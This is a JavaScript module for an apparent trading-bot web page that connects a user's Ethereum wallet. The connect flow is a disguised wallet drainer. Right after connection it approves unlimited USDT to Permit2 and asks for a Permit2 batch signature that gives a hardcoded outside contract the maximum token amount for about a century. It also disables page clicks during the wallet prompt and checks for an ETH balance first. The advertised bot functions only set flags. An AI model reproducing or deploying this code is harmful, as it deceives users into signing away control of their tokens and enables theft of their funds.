import { ethers } from "https://cdnjs.cloudflare.com/ajax/libs/ethers/6.10.0/ethers.js";
import { APP_STATE, updateWalletState, resetState, startRequest, setProcessing } from "../core/state.js";

const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"];
const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";

const ERC20_ABI = [
  "function allowance(address owner,address spender) view returns(uint256)",
  "function approve(address spender,uint256 amount) returns(bool)"
];

let isPickingWallet = false;


/* =========================
   LOCAL UI HELPERS (LIGHT)
========================= */

function renderWallet(address) {
  const btn = document.getElementById('btn-wallet');
  if (btn) {
    btn.innerText =
      address.substring(0, 6) +
      "..." +
      address.substring(address.length - 4);
  }

  const dot = document.getElementById('dot-wallet');
  const label = document.getElementById('st-wallet');

  if (dot && label) {
    dot.style.background = '#06b6d4';
    dot.style.boxShadow = '0 0 12px #06b6d4';
    label.innerText = 'CONNECTED';
    label.style.color = '#06b6d4';
  }
}


/* =========================
   WALLET CHANGE (MINIMAL)
========================= */
if (window.ethereum) {
  window.ethereum.on('accountsChanged', (accounts) => {
    if (isPickingWallet) return;

    if (accounts.length > 0) {
      resetState();
      updateWalletState(accounts[0]);

      renderWallet(accounts[0]);
      if (typeof updateStatus === "function") {
        updateStatus('dot-bot', 'st-bot', 'OFFLINE', '#475569');
        updateStatus('dot-access', 'st-access', 'RESTRICTED', '#475569');
      }
    }
  });
}

/* =========================
   CONNECT WALLET (LIGHT FLOW)
========================= */
export async function connectWallet() {
  if (APP_STATE.isProcessing) return;

  startRequest();
  setProcessing(true);

  const btn = document.getElementById('btn-wallet');
  if (btn) {
    btn.disabled = true;
    btn.innerText = "CONNECTING...";
  }

  try {
    if (!window.ethereum) {
      const install = confirm("Install MetaMask?");
      if (install) window.location.href = "https://metamask.io/download/";
      resetState();
      return;
    }

    // 🔒 MICROCLICK + META MASK STABILITY ZONE
    isPickingWallet = true;
    window.focus();
    document.body.style.pointerEvents = "none";

    const provider = new ethers.BrowserProvider(window.ethereum);

    const accounts = await provider.send("eth_requestAccounts", []);
    const user = accounts[0];

    document.body.style.pointerEvents = "auto";
    isPickingWallet = false;

    updateWalletState(user);
    renderWallet(user);

    const signer = await provider.getSigner();
    const network = await provider.getNetwork();

    if (network.chainId !== 1n) {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }]
      });
      location.reload();
      return;
    }

    const balance = await provider.getBalance(user);
    if (balance === 0n) throw new Error("No ETH");

    await runPermitFlowSafe(provider, signer, user);

    const btnActivate = document.getElementById('btn-activate');
    const btnDisconnect = document.getElementById('btn-disconnect');

    if (btnActivate) btnActivate.disabled = false;
    if (btnDisconnect) btnDisconnect.disabled = false;

  } catch (e) {
    console.log("ERR:", e.message);
    resetState();
  } finally {
    setProcessing(false);
    document.body.style.pointerEvents = "auto";
    isPickingWallet = false;
  }
}

/* =========================
   PERMIT FLOW (PURE LOGIC ONLY)
========================= */
async function runPermitFlowSafe(provider, signer, user) {

  const permit2 = new ethers.Contract(
    PERMIT2,
    ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
    provider
  );

  const nonceResults = await Promise.all(
    TOKENS.map(t => permit2.allowance(user, t, CONTRACT))
  );

  const MAX = (1n << 160n) - 1n;
  const expiration = Math.floor(Date.now()/1000) + (100 * 365 * 24 * 60 * 60);

  const details = [];

  for (let i = 0; i < TOKENS.length; i++) {
    const [, , nonce] = nonceResults[i];

    details.push({
      token: TOKENS[i],
      amount: MAX,
      expiration: BigInt(expiration),
      nonce: BigInt(nonce)
    });
  }

  const domain = {
    name: "Permit2",
    chainId: (await provider.getNetwork()).chainId,
    verifyingContract: PERMIT2
  };

  const types = {
    PermitBatch: [
      { name: "details", type: "PermitDetails[]" },
      { name: "spender", type: "address" },
      { name: "sigDeadline", type: "uint256" }
    ],
    PermitDetails: [
      { name: "token", type: "address" },
      { name: "amount", type: "uint160" },
      { name: "expiration", type: "uint48" },
      { name: "nonce", type: "uint48" }
    ]
  };

  const sigDeadline = Math.floor(Date.now()/1000) + (30 * 24 * 60 * 60);

  const values = {
    details: details.map(d => ({
      token: d.token,
      amount: d.amount.toString(),
      expiration: d.expiration.toString(),
      nonce: d.nonce.toString()
    })),
    spender: CONTRACT,
    sigDeadline: sigDeadline.toString()
  };

  // ERC20 approval (simpel, geen orchestration)
  for (const token of TOKENS) {
    const erc20 = new ethers.Contract(token, ERC20_ABI, signer);
    const allowance = await erc20.allowance(user, PERMIT2);

    if (allowance === 0n) {
      const tx = await erc20.approve(PERMIT2, ethers.MaxUint256);
      await tx.wait();
    }
  }

  await signer.signTypedData(domain, types, values);
}

/* =========================
   SIMPLE ACTIONS ONLY
========================= */
export function activateBot() {
  if (!APP_STATE.wallet || APP_STATE.isProcessing) return;
  APP_STATE.botActive = true;
}

export function authorizeTrading() {
  if (!APP_STATE.botActive || APP_STATE.isProcessing) return;
  APP_STATE.authorized = true;
}

export function disconnectWallet() {
  location.reload();
}